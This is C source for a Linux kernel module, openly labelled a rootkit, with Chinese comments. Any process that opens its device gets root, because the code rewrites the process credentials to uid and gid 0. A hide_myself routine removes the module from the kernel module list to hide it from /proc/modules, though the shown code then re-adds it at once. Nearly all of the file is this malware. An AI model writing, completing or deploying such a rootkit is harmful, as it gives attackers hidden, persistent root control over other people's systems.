#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/fs.h>
#include <linux/device.h>
#include "rootkit.h"

// 修改cred获得root权限
void get_root(void)
{
    struct cred *newcreds;
    newcreds = prepare_creds();
    if (newcreds == NULL)
        return;
    newcreds->uid.val = newcreds->gid.val = 0;
    newcreds->euid.val = newcreds->egid.val = 0;
    newcreds->suid.val = newcreds->sgid.val = 0;
    newcreds->fsuid.val = newcreds->fsgid.val = 0;
    commit_creds(newcreds);
}

static int rootkit_open(struct inode *__inode, struct file *__file)
{
    get_root();
    return 0;
}

static ssize_t rootkit_read(struct file *__file, char __user *user_buf, size_t size, loff_t *__loff)
{
    printk(KERN_INFO "get info");

    return 0;
}

static ssize_t rootkit_write(struct file *__file, const char __user *user_buf, size_t size, loff_t *__loff)
{
    printk(KERN_INFO "set root");

    return 0;
}

static int rootkit_release(struct inode *__inode, struct file *__file)
{
    return 0;
}

static long rootkit_ioctl(struct file *__file, unsigned int cmd, unsigned long param)
{
    return 0;
}
// 模块隐藏函数定义
static inline void module_info(void)
{
    prev = THIS_MODULE->list.prev;
}

static void hide_myself(void)
{
    // 摘除链表，/proc/modules中不可见
    list_del_init(&THIS_MODULE->list);

    // 摘除kobj，/sys/modules/中不可见。
    // kobject_del(&THIS_MODULE->mkobj.kobj);

    list_add(&THIS_MODULE->list, prev);
    // kobject_put(&mod.mkobj.kobj);
}
